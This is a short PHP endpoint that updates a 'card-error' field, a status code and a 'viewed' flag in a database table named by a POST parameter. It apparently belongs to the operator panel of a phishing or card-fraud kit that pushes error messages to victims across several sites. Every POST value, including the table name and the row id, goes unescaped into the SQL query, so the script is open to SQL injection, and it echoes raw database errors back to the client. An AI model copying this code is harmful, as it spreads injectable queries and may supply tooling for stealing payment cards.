<?php
require '../connection.php';

if ($_POST["card-error"] and $_POST["uniqueid"] && $_POST['selSite']) {
  $uniqueid = $_POST["uniqueid"];
  $carderror = $_POST["card-error"];
  $selSite = $_POST['selSite'];

  $verification_query = mysqli_query($conn, "UPDATE $selSite SET `card-error`='$carderror', status=9, viewed='false' WHERE id=$uniqueid");


  if ($verification_query) {
    echo json_encode(array(
      'status' => 'success'
    ));
  } else {
    echo json_encode(array(
      'status' => 'failure',
      'error' => mysqli_error($conn)
    ));
  }
}
?>
